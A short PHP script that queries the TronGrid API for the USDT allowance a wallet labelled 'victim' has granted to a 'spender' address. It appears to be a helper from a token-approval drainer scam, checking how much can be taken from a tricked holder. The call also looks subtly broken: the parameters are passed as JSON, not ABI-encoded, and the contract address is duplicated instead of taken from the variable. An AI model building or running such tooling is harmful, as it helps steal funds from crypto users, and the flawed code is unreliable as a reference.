<?php
require_once 'config.php';

$victim = "TFCsjP6mNMTh2RwsdEvkM3u542dAKVaatT";
$spender = "TD94UkiL5qg5Y9ogZqdWdqZbT3F2nB86rK";
$contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

function checkAllowance($owner, $spender) {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.trongrid.io/wallet/triggerconstantcontract",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode([
            'contract_address' => 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
            'function_selector' => 'allowance(address,address)',
            'parameter' => json_encode([
                'type' => 'address,address',
                'value' => [$owner, $spender]
            ])
        ])
    ]);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    $data = json_decode($response, true);
    
    if (isset($data['constant_result'][0])) {
        $allowance = hexdec($data['constant_result'][0]) / 1e6;
        echo "✅ Allowance: " . number_format($allowance, 2) . " USDT\n";
        return $allowance;
    } else {
        echo "❌ No allowance found\n";
        return 0;
    }
}

echo "Victim: $victim\n";
echo "Spender: $spender\n";
echo "-----------------------------------\n";
checkAllowance($victim, $spender);
?>
